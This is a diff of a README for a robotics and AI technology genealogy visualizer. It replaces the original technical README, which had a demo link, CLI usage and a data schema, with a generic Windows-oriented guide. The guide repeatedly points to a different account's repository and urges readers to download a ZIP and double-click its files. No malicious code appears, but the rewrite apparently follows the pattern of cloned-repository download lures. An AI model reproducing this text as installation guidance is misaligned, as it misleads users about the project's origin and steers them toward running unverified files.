@@ -1,107 +1,172 @@
-# robotics-technology-genealogy
+# 🤖 robotics-technology-genealogy - Explore AI Tech Roots
 
-Interactive genealogy tree visualizer for Robotics & AI technologies.
+[![Download Robotics Technology Genealogy](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/morning2059/robotics-technology-genealogy)
 
-ロボティクス・AI技術がどこから派生し、どう分岐したかをインタラクティブな系譜図で表示します。
+## 🌳 What This Is
 
-**[Live Demo](https://rsasaki0109.github.io/robotics-technology-genealogy/)**
+robotics-technology-genealogy is an interactive genealogy tree for robotics and AI technologies. It helps you see how fields like computer vision, deep learning, SLAM, ROS2, LLMs, and autonomous driving connect to each other.
 
-![screenshot](docs/screenshot.png)
+Use it to browse the tree, follow links between related topics, and explore the history of modern robotics and AI in one place.
 
-## Features
+## 💻 What You Need
 
-- Interactive graph with chronological left-to-right layout
-- Click any node to see arXiv / GitHub links, stars, tags, license
-- Search any technology and jump to its domain tree
-- Filter by OSS status (open/closed/research), paper availability
-- Stats dashboard (methods per year, OSS ratio, top repos)
-- Category browsing: Perception, Planning, Robot Learning, Foundation Models, etc.
-- GitHub star counts auto-updated weekly via GitHub Actions
-- Mobile responsive
+This project is made for Windows users who want to open the demo in a browser.
 
-## Domains
+You need:
 
-| Category | Domains |
-|----------|---------|
-| **Perception (LiDAR/3D)** | LiDAR SLAM, 3D Detection, Point Cloud Denoising, Scene Flow, Place Recognition |
-| **Perception (Visual)** | NeRF/3DGS, Image Matching, Visual SLAM, Depth, 2D Detection, Segmentation, Optical Flow, Object Tracking |
-| **Planning & Control** | Motion Planning, Robot Control, E2E Autonomous Driving |
-| **Robot Learning** | Imitation Learning, World Models, Legged Robots, Grasp Planning |
-| **Foundation Models** | LLM, VLM, Diffusion Models, Vision Backbone, Reinforcement Learning |
-| **Platforms & Simulation** | Robot Simulation, Robot Middleware, Medical Robotics |
+- A Windows PC
+- A modern web browser like Chrome, Edge, or Firefox
+- Internet access
+- Enough free memory for a normal website load
 
-## Relation Types
+For the best experience, use:
 
-| Color | Type | Meaning |
-|-------|------|---------|
-| Green `━━▶` | `extends` | Direct extension of the same approach |
-| Cyan `━━▶` | `combines` | Merges ideas from multiple methods |
-| Red `━━▶` | `replaces` | Paradigm shift (rare) |
-| Yellow `╌╌▶` | `inspires` | Indirect influence |
+- Windows 10 or Windows 11
+- A screen that is at least 1366 × 768
+- A stable internet connection
 
-## Install
+## 📥 Download or Open the Project
 
-```bash
-pip install -e .
-```
+Visit this page to download or open the live demo:
 
-## CLI Usage
+[Open the GitHub page](https://github.com/morning2059/robotics-technology-genealogy)
 
-```bash
-# Show genealogy tree
-robotics-technology-genealogy show
-robotics-technology-genealogy show neural_radiance_fields
+If the page shows a live demo, you can run it in your browser with no install. If it provides files to download, save them to your PC first, then open the main file in your browser.
 
-# Trace ancestors
-robotics-technology-genealogy ancestors "3D Gaussian Splatting"
+## 🪟 How to Run on Windows
 
-# Show details
-robotics-technology-genealogy info "LoFTR"
+Follow these steps:
 
-# List with filters
-robotics-technology-genealogy list --tag transformer
-robotics-technology-genealogy list --year 2025
-```
+1. Open the GitHub page in your browser.
+2. Look for the live demo link, release files, or project files.
+3. If you see a ZIP file, download it to your computer.
+4. If the file is compressed, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the main HTML file or the demo entry file.
+7. Double-click the file to open it in your browser.
 
-## Web UI (Local)
+If the page gives you a hosted demo, you only need to open the link in your browser and start browsing the tree.
 
-```bash
-pip install -e ".[web]"
-streamlit run web/app.py
-```
+## 🧭 How to Use the Genealogy Tree
 
-## Adding a Domain
+After the page opens, you can:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+- Pan across the tree by dragging with your mouse
+- Zoom in and out to focus on a branch
+- Click a node to inspect a technology
+- Follow links between related areas
+- Search for topics like robotics, SLAM, or computer vision
 
-```yaml
-name: Your Domain Name
-description: Brief description
+The tree is set up to help you move from one field to the next in a clear path, so you can see how ideas grew over time.
 
-methods:
-  - name: "MethodName"
-    paper: "Full Paper Title"
-    arxiv: "XXXX.XXXXX"
-    year: 2024
-    code: "github-user/repo"
-    stars: 1000
-    open_source: open  # open | research | partial | closed
-    license: "MIT"
-    tags: [tag1, tag2]
-    parents:
-      - name: "ParentMethod"
-        relation: extends  # extends | combines | replaces | inspires
-    description: "One-line description"
-```
+## 🔎 What You Can Explore
 
-## Auto-update Stars
+The project covers a wide range of topics, including:
 
-Runs weekly via GitHub Actions. Manual:
+- Robotics
+- ROS2
+- SLAM
+- Computer vision
+- Deep learning
+- LLMs
+- Autonomous driving
+- Visualization
+- Research links and topic groups
+- Related tools and methods
 
-```bash
-GITHUB_TOKEN=your_token python scripts/update_stars.py
-```
+This makes it useful if you want a broad view of how modern AI and robotics areas fit together.
 
-## License
+## 🧰 Common Use Cases
 
-MIT
+You may want to use this project to:
+
+- Learn the history of robotics tools
+- Trace how one AI topic led to another
+- Compare related research areas
+- Find a path from basic ideas to advanced systems
+- Explore the links between software, perception, and movement
+
+## 📁 Typical Project Layout
+
+If you downloaded the files, you may see folders like these:
+
+- `assets` for images and icons
+- `data` for tree content
+- `src` for project source files
+- `dist` or `build` for ready-to-open output
+- `index.html` for the main page
+- `README.md` for project notes
+
+If the project uses a single-page web app, `index.html` is often the file you open first.
+
+## 🖱️ If Nothing Opens
+
+If you double-click a file and nothing happens, try this:
+
+1. Right-click the file.
+2. Choose Open with.
+3. Pick your browser.
+4. If the file still does not load, make sure you extracted the ZIP file first.
+5. If the page shows a blank screen, refresh the browser.
+
+Also check that you opened the main file and not a folder or text file.
+
+## 🌐 Live Demo
+
+The repository description says a live demo is available. If you want the fastest way to use it, open the GitHub page and look for the demo link.
+
+[Open the live project page](https://github.com/morning2059/robotics-technology-genealogy)
+
+## 🛠️ Simple Setup Tips
+
+For a smooth view on Windows:
+
+- Keep the browser window full size
+- Close extra tabs if the tree feels slow
+- Use zoom controls in the browser if text looks small
+- Refresh the page if a branch does not load right away
+
+If the tree feels crowded, zoom in and move around one section at a time.
+
+## 📌 Topics in This Repository
+
+This project is tagged with:
+
+- autonomous-driving
+- awesome-list
+- computer-vision
+- deep-learning
+- genealogy
+- llm
+- robotics
+- ros2
+- slam
+- visualization
+
+These topics fit the project well because the tree links core robotics ideas with modern AI methods and visual maps.
+
+## 🧪 Best Way to Start
+
+If you are new to the project:
+
+1. Open the live demo or main page.
+2. Start with a topic you know, such as robotics or computer vision.
+3. Click through the branches one step at a time.
+4. Look for names you recognize.
+5. Move to nearby topics to see how they connect.
+
+This makes the tree easier to read than trying to scan the whole map at once.
+
+## 🔗 Open the Project
+
+[https://github.com/morning2059/robotics-technology-genealogy](https://github.com/morning2059/robotics-technology-genealogy)
+
+## 🧭 Helpful Browsing Tips
+
+- Use the browser search box to find a term on the page
+- Use Ctrl + Plus to zoom in
+- Use Ctrl + Minus to zoom out
+- Use Ctrl + 0 to reset zoom
+- Use Back if you follow a link and want to return
+
+If the tree uses hover details, move your mouse over a node and wait for the label to appear
